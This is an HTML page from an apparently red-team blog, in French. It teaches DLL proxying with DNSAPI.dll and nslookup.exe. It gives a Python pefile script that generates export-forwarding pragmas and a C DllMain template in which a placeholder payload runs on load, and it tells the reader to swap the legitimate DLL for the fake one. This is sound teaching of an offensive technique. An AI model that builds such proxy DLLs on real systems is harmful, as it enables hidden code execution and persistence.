@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+
+    
+      <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; font-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; form-action 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; frame-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; img-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; object-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; style-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; script-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; prefetch-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com; connect-src 'self' 'unsafe-inline' https://fonts.gstatic.com https://www.google-analytics.com https://cdn.jsdelivr.net/ disqus.com disquscdn.com *.disqus.com *.disquscdn.com;">
+
+    
+
+    <meta name="author" content="Sh0ckFR">
+    <meta name="description" content="Martin et le DLL Proxying de cristal">
+    <meta name="keywords" content="redteam, red-team, infosec, security, pentest, forensics, ">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Martin et le DLL Proxying de cristal"/>
+<meta name="twitter:description" content="Martin et le DLL Proxying de cristal"/>
+
+    <meta property="og:title" content="Martin et le DLL Proxying de cristal" />
+<meta property="og:description" content="Martin et le DLL Proxying de cristal" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sh0ckfr.github.io/pages/martin-et-le-dll-proxying-de-cristal/" /><meta property="article:section" content="pages" />
+<meta property="article:published_time" content="2022-05-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-05-16T00:00:00+00:00" />
+
+
+
+    <title>
+  Martin et le DLL Proxying de cristal · Sh0ckFR&#39;s Website | CyberPunk, Born in the binary world of the computer security
+</title>
+
+    
+      <link rel="canonical" href="https://sh0ckfr.github.io/pages/martin-et-le-dll-proxying-de-cristal/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.d9fddbffe6f27e69985dc5fe0471cdb0e57fbf4775714bc3d847accb08f4a1f6.css" integrity="" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.002ee2378e14c7a68f1f0a53d9694ed252090987c4e768023fac694a4fc5f793.css" integrity="" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.94.1" />
+  </head>
+
+  
+  
+    
+  
+  <body class="preload-transitions colorscheme-dark">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        <li class="navigation-item">
+          <a class="navigation-link" href="/">Accueil</a>
+        </li>
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/pages/">Articles</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">À propos</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://sh0ckfr.github.io/pages/martin-et-le-dll-proxying-de-cristal/">
+          Martin et le DLL Proxying de cristal
+        </a>
+      </h1>
+    </header>
+
+    <p>Bonjour à tous et à toutes, pour faire suite à mon article <a href="/pages/martine-a-la-recherche-de-la-dll-hijacking-perdue/">Martine à la recherche de la DLL Hijacking perdue</a> je vous propose aujourd&rsquo;hui un article sur le DLL Proxying.</p>
+<p><img src="/images/martin-dll-proxying.jpg" alt="Sh0ckFR DLL Proxying"></p>
+<p>Comme vous vous en doutez, le gars au centre c&rsquo;est Martin et il ne savait pas trop ce qu&rsquo;il lui arrivait avec ce pouvoir entre les mains, ici c&rsquo;est pareil.</p>
+<p>Vous avez pu comprendre les mécanismes du DLL Hijacking dans mon précédent post, mais je n&rsquo;avais pas évoqué un point important.</p>
+<p>Effectivement, que se passe t&rsquo;il si on redirige une fonction d&rsquo;un programme sans pour autant rediriger les autres fonctions de celui-ci ? vous avez 4 heures.</p>
+<p>En vrai c&rsquo;est relativement simple, ça peut crash, du moins vous pouvez bloquer l&rsquo;exécution d&rsquo;un programme et exécuter votre charge utile sans attendre de retour mais cela rend l&rsquo;application originale inutilisable.</p>
+<p>Dans un contexte où l&rsquo;application n&rsquo;est pas vraiment nécessaire pour l&rsquo;utilisateur, ça fonctionne relativement bien, mais imaginez bloquer une bibliothèque importante pour un programme de l&rsquo;utilisateur, votre charge utile fonctionnera mais l&rsquo;utilisateur ne pourra plus utiliser son application originale.</p>
+<p>Mais alors comment faire ?</p>
+<p>La réponse est simple, rediriger TOUTES les fonctions du programme original (donc faire un DLL hijacking sur toutes les fonctions connues) et garder notre fonction vulnérable pour exécuter notre charge utile.</p>
+<p>Reprenons l&rsquo;exemple dans le précédent post, vous aviez vu <code>nslookup.exe</code> utilisait une librairie vulnérable au DLL Hijacking <code>DNSAPI.dll</code>, pour retrouver toutes nos fonctions il existe un programme :</p>
+<p><a href="http://www.nirsoft.net/utils/dllexp-x64.zip">http://www.nirsoft.net/utils/dllexp-x64.zip</a></p>
+<p>On peut donc retrouver la table d&rsquo;export via ce logiciel :</p>
+<p><img src="/images/dll-proxying-1.png" alt="Sh0ckFR DLL Proxying"></p>
+<p>Et là magie, on retrouve notre fonction utilisée dans le précédent post <code>DnsQueryConfigAllocEx</code></p>
+<p><img src="/images/dll-proxying-2.png" alt="Sh0ckFR DLL Proxying"></p>
+<p>Une autre solution pour éviter d&rsquo;être dépendant de notre programme <code>DLL Export Viewer</code> et d&rsquo;utiliser la librairie <code>pefile</code> pour Python :</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">import</span> pefile
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exported_functions = []
+</span></span><span style="display:flex;"><span>pe = pefile.PE(<span style="color:#0086d2">&#39;C:</span><span style="color:#0086d2">\\</span><span style="color:#0086d2">windows</span><span style="color:#0086d2">\\</span><span style="color:#0086d2">system32</span><span style="color:#0086d2">\\</span><span style="color:#0086d2">DNSAPI.dll&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">for</span> entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:
+</span></span><span style="display:flex;"><span>    func = entry.name.decode(<span style="color:#0086d2">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>    exported_functions.append(<span style="color:#0086d2">f</span><span style="color:#0086d2">&#39;#pragma comment(linker,&#34;/export:</span><span style="color:#0086d2">{</span>func<span style="color:#0086d2">}</span><span style="color:#0086d2">=proxy.</span><span style="color:#0086d2">{</span>func<span style="color:#0086d2">}</span><span style="color:#0086d2">,@</span><span style="color:#0086d2">{</span>entry.ordinal<span style="color:#0086d2">}</span><span style="color:#0086d2">&#34;)&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exported_functions = <span style="color:#0086d2">&#39;</span><span style="color:#0086d2">\n</span><span style="color:#0086d2">&#39;</span>.join(exported_functions)
+</span></span><span style="display:flex;"><span>print(exported_functions)
+</span></span></code></pre></div><p>Ce qui donne un résultat du genre :</p>
+<p><img src="/images/dll-proxying-3.png" alt="Sh0ckFR DLL Proxying"></p>
+<p>On voit que toutes les fonctions de DNSAPI.dll devront être redirigées vers une DLL nommée <code>proxy.dll</code>.</p>
+<p>Il n&rsquo;y a plus qu&rsquo;à copier les exports pour le linked afin que nous puissons créer une DLL <code>DNSAPI.dll</code> avec toutes les fonctions attendues par la DLL originale <code>DNSAPI.dll</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma once
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma comment(linker,&#34;/export:AdaptiveTimeout_ClearInterfaceSpecificConfiguration=proxy.AdaptiveTimeout_ClearInterfaceSpecificConfiguration,@1&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma comment(linker,&#34;/export:AdaptiveTimeout_ResetAdaptiveTimeout=proxy.AdaptiveTimeout_ResetAdaptiveTimeout,@2&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma comment(linker,&#34;/export:AddRefQueryBlobEx=proxy.AddRefQueryBlobEx,@3&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma comment(linker,&#34;/export:BreakRecordsIntoBlob=proxy.BreakRecordsIntoBlob,@4&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma comment(linker,&#34;/export:Coalesce_UpdateNetVersion=proxy.Coalesce_UpdateNetVersion,@5&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma comment(linker,&#34;/export:CombineRecordsInBlob=proxy.CombineRecordsInBlob,@6&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">#pragma comment(linker,&#34;/export:DeRefQueryBlobEx=proxy.DeRefQueryBlobEx,@7&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic"></span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#cdcaa9;font-weight:bold">int</span> Main()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">// Your payload code.
+</span></span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">switch</span> (fdwReason)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">case</span> DLL_PROCESS_ATTACH:
+</span></span><span style="display:flex;"><span>        Main();
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Il suffit ensuite de renommer la DLL originale <code>DNSAPI.dll</code> en <code>proxy.dll</code> et de copier notre nouvelle librairie <code>DNSAPI.dll</code> dans le même répertoire que le programme original et vous avez donc comme résultat un DLL Proxying parfait qui ne fera pas planter l&rsquo;application originale.</p>
+<p>Bien entendu, j&rsquo;ai implémenté l&rsquo;automatisation du DLL Proxying dans <a href="https://github.com/Sh0ckFR/DLLirant">DLLirant</a> via l&rsquo;argument <code>--proxydll</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3 DLLirant.py -p <span style="color:#0086d2">&#34;C:\THEFULLPATH\VulnerableDLL.dll&#34;</span>
+</span></span></code></pre></div><h2 id="crédits">
+  Crédits
+  <a class="heading-link" href="#cr%c3%a9dits">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p>itm4n - <a href="https://itm4n.github.io/dll-proxying/">https://itm4n.github.io/dll-proxying/</a></p>
+
+  </article>
+</section>
+
+  
+
+      </div>
+
+      <footer class="footer">
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.8fb86376a16e684af472a329aef502dbebcfab65ce264e9750d144912947c602.js" integrity=""></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
